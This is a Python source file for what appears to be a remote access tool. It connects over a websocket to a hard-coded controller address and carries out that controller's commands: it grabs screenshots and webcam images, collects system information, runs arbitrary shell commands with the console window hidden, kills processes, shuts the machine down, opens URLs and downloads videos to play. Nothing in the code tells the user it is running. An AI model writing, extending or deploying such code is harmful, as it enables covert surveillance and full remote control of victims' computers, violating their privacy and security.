import asyncio
import websockets
import json
import socket
import platform
import pyautogui
import cv2
import os
import subprocess
import ctypes
import requests
import pytube
import random
import psutil
from uuid import uuid4

async def client():
    async with websockets.connect("ws://192.168.0.104:8765") as websocket:
        await websocket.send("computer_id")
        async for message in websocket:
            data = json.loads(message)
            command = data["command"]
            response = {}
            
            if command == "get_ip":
                try:
                    ip = socket.gethostbyname(socket.gethostname())
                    response = {"ip": ip}
                except Exception as e:
                    response = {"message": str(e)}
            
            elif command == "take_screenshot":
                try:
                    import mss
                    with mss.mss() as sct:
                        monitors = sct.monitors
                        monitor_index = data["data"]["monitor_index"]
                        if monitor_index >= len(monitors):
                            response = {"message": f"Monitor {monitor_index} not found"}
                        else:
                            monitor = monitors[monitor_index]
                            screenshot = sct.grab(monitor)
                            filename = f"screenshot_monitor_{monitor_index}.png"
                            mss.tools.to_png(screenshot.rgb, screenshot.size, output=filename)
                            response = {"file": filename}
                except Exception as e:
                    response = {"message": str(e)}
            
            elif command == "get_sysinfo":
                sysinfo = f"""
💻 <b>System Information</b>
• <b>OS:</b> {platform.system()}
• <b>Hostname:</b> {platform.node()}
• <b>Release:</b> {platform.release()}
• <b>Version:</b> {platform.version()}
• <b>Architecture:</b> {platform.machine()}
• <b>Processor:</b> {platform.processor()}
"""
                response = {"sysinfo": sysinfo}
            
            elif command == "take_webcam":
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    response = {"message": "Webcam unavailable"}
                else:
                    ret, frame = cap.read()
                    if ret:
                        filename = str(uuid4()) + '.png'
                        cv2.imwrite(filename, frame)
                        response = {"file": filename}
                    else:
                        response = {"message": "Failed to capture webcam image"}
                    cap.release()
            
            elif command == "shutdown":
                if platform.system() == 'Windows':
                    os.system("shutdown /s /t 0")
                elif platform.system() == 'Linux':
                    os.system("shutdown now")
                response = {}
            
            elif command == "execute_cmd":
                try:
                    result = subprocess.run(data["data"]["command"], shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    output = result.stdout if result.stdout else result.stderr
                    if not output:
                        output = "Command executed successfully (no output)"
                    response = {"output": output}
                except Exception as e:
                    response = {"message": str(e)}
            
            elif command == "get_processes":
                processes = [(p.name(), p.pid) for p in psutil.process_iter(['name', 'pid']) if p.name().lower() in ['wallpaper64.exe', 'notepad.exe', 'chrome.exe', 'firefox.exe', 'explorer.exe']]
                response = processes[:10]
            
            elif command == "kill_process":
                try:
                    process = psutil.Process(data["data"]["pid"])
                    process.terminate()
                    response = {"name": process.name()}
                except Exception as e:
                    response = {"message": str(e)}
            
            elif command == "set_wallpaper_file":
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(data["data"]["file"]), 3)
                    response = {}
                except Exception as e:
                    response = {"message": str(e)}
            
            elif command == "open_url":
                try:
                    import webbrowser
                    webbrowser.open(data["data"]["url"])
                    response = {}
                except Exception as e:
                    response = {"message": str(e)}
            
            elif command == "play_video":
                try:
                    yt = pytube.YouTube(data["data"]["url"])
                    stream = yt.streams.filter(progressive=True, file_extension='mp4').first()
                    filename = str(uuid4()) + '.mp4'
                    stream.download(filename=filename)
                    os.startfile(filename)
                    response = {"title": yt.title}
                except Exception as e:
                    response = {"message": str(e)}
            
            elif command == "roll_dice":
                response = {"result": random.randint(1, 6)}
            
            await websocket.send(json.dumps(response))

asyncio.run(client())